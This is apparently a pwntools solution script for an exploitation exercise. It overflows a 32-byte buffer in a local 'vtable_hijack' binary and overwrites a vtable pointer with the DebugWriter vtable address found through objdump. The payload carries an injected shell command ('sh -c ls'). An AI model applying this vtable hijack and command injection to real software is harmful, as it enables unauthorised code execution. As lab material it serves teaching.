#!/usr/bin/env python3

from pwn import *
import subprocess

target = process("../bin/vtable_hijack")

payload = b"';sh -c ls;'"               # command injection payload
payload += b"a" * (32 - len(payload))   # padding for rest of the buffer

# auto detect the vtable address for DebugWriter
# you should check if this is actually correct,
# idk if the compiler mangles name differently
vuln_vtable = subprocess.check_output(["objdump -d ../bin/vtable_hijack | grep '<_ZTV11DebugWriter'"], shell=True).split()
vuln_vtable = vuln_vtable[vuln_vtable.index(b"#") + 1]
vuln_vtable = int(vuln_vtable, 16)

print(f"Found DebugWriter vtable: {hex(vuln_vtable)}")

payload += p64(vuln_vtable)

target.sendline(payload)
target.interactive()

